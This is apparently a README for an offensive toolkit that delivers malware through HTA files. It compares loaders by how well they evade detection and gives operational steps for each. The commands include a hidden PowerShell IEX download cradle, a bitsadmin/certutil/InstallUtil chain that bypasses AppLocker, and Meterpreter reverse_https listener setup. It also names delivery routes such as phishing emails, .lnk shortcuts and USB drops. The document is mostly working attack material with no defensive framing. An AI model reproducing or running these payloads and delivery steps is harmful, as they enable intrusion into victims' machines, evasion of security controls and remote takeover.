# HTA Delivery

## Files

| File | Purpose |
|---|---|
| `black.hta` | bitsadmin download → certutil decode → InstallUtil AppLocker bypass |
| `red.hta` | PowerShell download cradle → in-memory execution, no disk artifacts |
| `certutil-method/` | certutil download + decode + InstallUtil — uses monitored LOLBins |
| `self-decode-method/` | Embedded Base64 payload decoded via VBScript — no downloads, but HTA is huge |
| `http-decode-method/` | **HTTP download + MSXML2/ADODB.Stream decode + InstallUtil — no LOLBins, HTA stays ~2KB** |

## When to Use Which

| | `black.hta` | `red.hta` | `http-decode-method/` | `self-decode-method/` |
|---|---|---|---|---|
| AppLocker blocking PowerShell | ✓ | ✗ | ✓ | ✓ |
| No AppLocker | ✓ | ✓ | ✓ | ✓ |
| Disk artifacts | `shell.exe` in `C:\Windows\Tasks\` | None | `svc.exe` in `%TEMP%` | `svc.exe` in `%TEMP%` |
| LOLBin usage | bitsadmin + certutil | None (PS cradle) | **None (COM objects)** | None |
| HTA file size | ~1KB | ~1KB | **~2KB** | ~1.33x payload |
| Needs HTTP server | ✓ | ✓ | ✓ | ✗ |
| Complexity | 3-step chain | Single PS cradle | 2-step chain | 1-step (embedded) |

---

## black.hta

**1. Encode your payload:**
```powershell
certutil -encode shell.exe clm.txt
```

**2. Host `clm.txt` on your HTTP server:**
```bash
python3 -m http.server 80
```

**3. Update the attacker IP in `black.hta`:**
```js
shell.Run("bitsadmin /transfer myjob /download /priority FOREGROUND http://<YOUR_IP>/clm.txt ...", 0, true);
```

**4. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**5. Deliver to target** — email attachment, SMB share, phishing page, or `.lnk` shortcut pointing to `mshta.exe black.hta`.

---

## red.hta

**1. Host your PowerShell payload on your HTTP server:**
```bash
python3 -m http.server 80
```

**2. Update the attacker IP in `red.hta`:**
```js
shell.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://<YOUR_IP>/payload.ps1')\"", 0, false);
```

**3. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**4. Deliver to target** — same delivery methods as above.

---
## http-decode-method/

**1. Encode your payload (for `loader.hta` only — b64 version):**
```powershell
certutil -encode loader.exe loader.b64
```

**2. Host the payload on your HTTP server:**
```bash
# For loader.hta (b64):
python3 -m http.server 80
# Place loader.b64 in the same directory

# For loader-raw.hta (raw binary):
# Just place loader.exe in the same directory — no encoding needed
```

**3. Update the attacker IP in the HTA:**
```vbscript
' In loader.hta:
Dim payloadUrl : payloadUrl = "http://<YOUR_IP>/loader.b64"

' In loader-raw.hta:
Dim payloadUrl : payloadUrl = "http://<YOUR_IP>/loader.exe"
```

**4. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**5. Deliver to target** — email attachment, SMB share, phishing page, `.lnk` shortcut pointing to `mshta.exe loader.hta`, or USB drop.
